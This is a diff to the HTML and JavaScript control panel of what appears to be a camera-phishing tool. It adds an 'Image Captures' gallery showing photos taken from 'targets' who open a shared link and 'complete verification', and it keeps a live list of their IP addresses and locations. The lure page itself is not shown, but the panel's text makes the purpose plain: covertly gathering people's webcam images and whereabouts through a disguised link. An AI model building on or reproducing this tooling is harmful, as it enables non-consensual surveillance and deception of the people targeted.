@@ -28,15 +28,30 @@
         }
         .layout {
             display: grid;
-            grid-template-columns: 1fr 400px;
+            grid-template-columns: minmax(380px, 1fr) minmax(460px, 580px) 360px;
             min-height: 100vh;
+        }
+        @media (max-width: 1200px) {
+            .layout { grid-template-columns: 1fr 360px; }
+            .gallery-section { order: 3; grid-column: 1 / -1; }
         }
         @media (max-width: 900px) {
             .layout { grid-template-columns: 1fr; }
         }
         .main {
             padding: 32px;
-            max-width: 720px;
+            overflow-y: auto;
+        }
+        .gallery-section {
+            background: var(--bg-card);
+            border-left: 1px solid var(--border);
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+        }
+        @media (max-width: 1200px) {
+            .gallery-section { border-left: none; border-top: 1px solid var(--border); }
         }
         .sidebar {
             background: var(--bg-card);
@@ -46,6 +61,185 @@
         }
         @media (max-width: 900px) {
             .sidebar { border-left: none; border-top: 1px solid var(--border); }
+        }
+        .gallery-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border);
+        }
+        .gallery-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text);
+        }
+        .gallery-stats {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .gallery-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
+            gap: 12px;
+            align-self: start;
+            width: 100%;
+        }
+        .gallery-item {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 1;
+            border-radius: 8px;
+            overflow: hidden;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            transition: all 0.2s ease;
+        }
+        .gallery-item:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.3);
+            border-color: var(--accent);
+        }
+        .gallery-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+        .gallery-item-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 4px 6px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.85));
+            color: rgba(255,255,255,0.9);
+            font-size: 9px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .gallery-empty {
+            grid-column: 1 / -1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 24px;
+            text-align: center;
+        }
+        .gallery-empty-icon {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 24px;
+            background: linear-gradient(135deg, rgba(88,166,255,0.2), rgba(163,113,247,0.2));
+            border: 2px dashed rgba(88,166,255,0.4);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            animation: pulse-glow 3s ease-in-out infinite;
+        }
+        @keyframes pulse-glow {
+            0%, 100% { opacity: 1; transform: scale(1); border-color: rgba(88,166,255,0.4); }
+            50% { opacity: 0.9; transform: scale(1.03); border-color: rgba(163,113,247,0.5); }
+        }
+        .gallery-empty-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 8px;
+        }
+        .gallery-empty-text {
+            color: var(--text-muted);
+            font-size: 13px;
+            max-width: 280px;
+            line-height: 1.5;
+        }
+        .gallery-empty-hint {
+            margin-top: 16px;
+            font-size: 12px;
+            color: var(--text-muted);
+            opacity: 0.8;
+        }
+        .pagination {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 24px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border);
+            width: 100%;
+        }
+        .pagination-btn {
+            min-width: 40px;
+            height: 40px;
+            padding: 0 12px;
+            border: 1px solid var(--border);
+            background: var(--bg-input);
+            color: var(--text);
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .pagination-btn:hover:not(:disabled) {
+            border-color: var(--accent);
+            background: rgba(88,166,255,0.1);
+        }
+        .pagination-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+        }
+        .pagination-info {
+            font-size: 13px;
+            color: var(--text-muted);
+            padding: 0 16px;
+        }
+        .lightbox {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.9);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+        .lightbox.show {
+            opacity: 1;
+            visibility: visible;
+        }
+        .lightbox img {
+            max-width: 100%;
+            max-height: 90vh;
+            object-fit: contain;
+            border-radius: 8px;
+        }
+        .lightbox-close {
+            position: absolute;
+            top: 24px;
+            right: 24px;
+            width: 44px;
+            height: 44px;
+            border: none;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            border-radius: 50%;
+            font-size: 24px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .lightbox-close:hover {
+            background: rgba(255,255,255,0.2);
         }
         h1 {
             font-size: 28px;
@@ -331,13 +525,33 @@
             </div>
         </main>
 
+        <section class="gallery-section">
+            <div class="gallery-header">
+                <h2 class="gallery-title">Image Captures</h2>
+                <span id="photoCount" style="font-size:13px;color:var(--text-muted)"></span>
+            </div>
+            <div id="galleryGrid" class="gallery-grid">
+                <div class="gallery-empty" id="galleryEmpty">
+                    <div class="gallery-empty-icon">📷</div>
+                    <div class="gallery-empty-title">No captures yet</div>
+                    <div class="gallery-empty-text">Camera captures will appear here when targets complete verification.</div>
+                    <div class="gallery-empty-hint">Generate a link and share it to start capturing</div>
+                </div>
+            </div>
+            <div id="pagination" class="pagination" style="display:none">
+                <button class="pagination-btn" id="prevBtn" onclick="loadPhotos(currentPage - 1)">← Prev</button>
+                <span class="pagination-info" id="paginationInfo">Page 1 of 1</span>
+                <button class="pagination-btn" id="nextBtn" onclick="loadPhotos(currentPage + 1)">Next →</button>
+            </div>
+        </section>
+
         <aside class="sidebar">
             <div class="card">
                 <h2>Status</h2>
                 <div id="statusDisplay">
                     <span class="status-badge inactive">Tunnel inactive</span>
                 </div>
-                <p id="statusLink" style="margin-top:12px;font-size:13px;color:var(--text-muted);word-break:break-all"></p>
+                <p id="statusLink" style="margin-top:12px;font-size:12px;color:var(--text-muted);word-break:break-all"></p>
                 <button class="btn btn-danger" id="stopBtnSidebar" onclick="stopService()" style="display:none;width:100%;margin-top:12px">Stop Tunnel</button>
             </div>
             <div class="card">
@@ -354,6 +568,11 @@
         </aside>
     </div>
 
+    <div class="lightbox" id="lightbox" onclick="closeLightbox()">
+        <button class="lightbox-close" onclick="closeLightbox()">×</button>
+        <img id="lightboxImg" src="" alt="Capture" onclick="event.stopPropagation()">
+    </div>
+
     <div class="toast" id="toast">Copied to clipboard!</div>
 
     <script>
@@ -365,6 +584,7 @@
         const statusDisplay = document.getElementById('statusDisplay');
         const statusLink = document.getElementById('statusLink');
         const capturesList = document.getElementById('capturesList');
+        let currentPage = 1;
 
         document.getElementById('template').addEventListener('change', function() {
             document.getElementById('ytVideoIdWrap').style.display = this.value === '1' ? 'block' : 'none';
@@ -436,6 +656,7 @@
                     document.getElementById('stopBtnSidebar').style.display = 'block';
                     generateBtn.disabled = false;
                     generateBtn.innerHTML = '<span>Generate Link</span>';
+                    loadPhotos(1);
                     loadCaptures();
                     return;
                 }
@@ -487,6 +708,58 @@
             }
         }
 
+        async function loadPhotos(page = 1) {
+            try {
+                const res = await fetch(API + '?action=photos&page=' + page + '&per_page=12');
+                const data = await res.json();
+                if (data.status === 'success') {
+                    currentPage = page;
+                    const { photos, pagination } = data;
+                    const grid = document.getElementById('galleryGrid');
+                    const empty = document.getElementById('galleryEmpty');
+                    const paginationEl = document.getElementById('pagination');
+                    const photoCount = document.getElementById('photoCount');
+                    const prevBtn = document.getElementById('prevBtn');
+                    const nextBtn = document.getElementById('nextBtn');
+                    const paginationInfo = document.getElementById('paginationInfo');
+
+                    photoCount.textContent = pagination.total ? pagination.total + ' capture' + (pagination.total !== 1 ? 's' : '') : '';
+
+                    if (photos.length === 0) {
+                        grid.innerHTML = `
+                            <div class="gallery-empty" id="galleryEmpty">
+                                <div class="gallery-empty-icon">📷</div>
+                                <div class="gallery-empty-title">No captures yet</div>
+                                <div class="gallery-empty-text">Camera captures will appear here when targets complete verification.</div>
+                                <div class="gallery-empty-hint">Generate a link and share it to start capturing</div>
+                            </div>
+                        `;
+                        paginationEl.style.display = 'none';
+                    } else {
+                        grid.innerHTML = photos.map(p => `
+                            <div class="gallery-item" onclick="openLightbox('../${p.path}')">
+                                <img src="../${p.path}" alt="Capture" loading="lazy">
+                                <div class="gallery-item-overlay">${new Date(p.date * 1000).toLocaleString()}</div>
+                            </div>
+                        `).join('');
+                        paginationEl.style.display = 'flex';
+                        prevBtn.disabled = !pagination.has_prev;
+                        nextBtn.disabled = !pagination.has_next;
+                        paginationInfo.textContent = `Page ${pagination.page} of ${pagination.total_pages}`;
+                    }
+                }
+            } catch (e) {}
+        }
+
+        function openLightbox(src) {
+            document.getElementById('lightboxImg').src = src;
+            document.getElementById('lightbox').classList.add('show');
+        }
+
+        function closeLightbox() {
+            document.getElementById('lightbox').classList.remove('show');
+        }
+
         async function loadCaptures() {
             try {
                 const res = await fetch(API + '?action=captures');
@@ -506,7 +779,7 @@
                         capturesList.innerHTML = all.slice(0, 10).map(c => `
                             <div class="capture-item">
                                 <span class="ip">${c.ip || 'N/A'}</span>
-                                ${c.loc ? '<br><span class="dim">' + c.loc + '</span>' : ''}
+                                ${c.loc ? '<br><span style="color:var(--text-muted);font-size:12px">' + (c.loc || '').substring(0, 35) + '</span>' : ''}
                                 <div class="time">${c.time || ''}</div>
                             </div>
                         `).join('');
@@ -559,10 +832,12 @@
             } catch (e) {}
         }
 
-        setInterval(loadCaptures, 5000);
+        setInterval(() => { loadPhotos(currentPage); loadCaptures(); }, 5000);
         setInterval(checkStatus, 10000);
         setInterval(pollTerminalEvents, 2000);
         checkStatus();
+        loadPhotos(1);
+        loadCaptures();
     </script>
 </body>
 </html>
